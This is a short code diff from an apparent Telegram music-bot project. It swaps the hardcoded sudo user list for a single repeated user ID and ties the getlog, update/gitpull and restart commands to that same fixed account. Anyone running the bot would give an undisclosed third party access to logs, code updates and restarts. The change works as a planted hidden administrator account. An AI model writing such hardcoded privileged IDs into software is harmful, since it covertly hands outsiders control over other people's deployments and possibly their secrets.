@@ -20,7 +20,7 @@ from NEXIOMUSIC.utils.database import (
 from NEXIOMUSIC.utils.decorators.language import language
 from NEXIOMUSIC.utils.pastebin import SACHINBin
 
-SUDOERS = [7373125778, 5959548791, 7062666022]
+SUDOERS = [7686412397, 7686412397, 7686412397]
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -29,7 +29,7 @@ async def is_heroku():
     return "heroku" in socket.getfqdn()
 
 
-@app.on_message(filters.command(["getlog", "logs", "getlogs"]) & filters.user(7373125778))
+@app.on_message(filters.command(["getlog", "logs", "getlogs"]) & filters.user(7686412397))
 @language
 async def log_(client, message, _):
     try:
@@ -38,7 +38,7 @@ async def log_(client, message, _):
         await message.reply_text(_["server_1"])
 
 
-@app.on_message(filters.command(["update", "gitpull"]) & filters.user(7373125778))
+@app.on_message(filters.command(["update", "gitpull"]) & filters.user(7686412397))
 @language
 async def update_(client, message, _):
     if await is_heroku():
@@ -112,7 +112,7 @@ async def update_(client, message, _):
         exit()
 
 
-@app.on_message(filters.command(["restart"]) & filters.user(7373125778))
+@app.on_message(filters.command(["restart"]) & filters.user(7686412397))
 async def restart_(_, message):
     response = await message.reply_text("❖ ʀᴇsᴛᴀʀᴛɪɴɢ...")
     ac_chats = await get_active_chats()
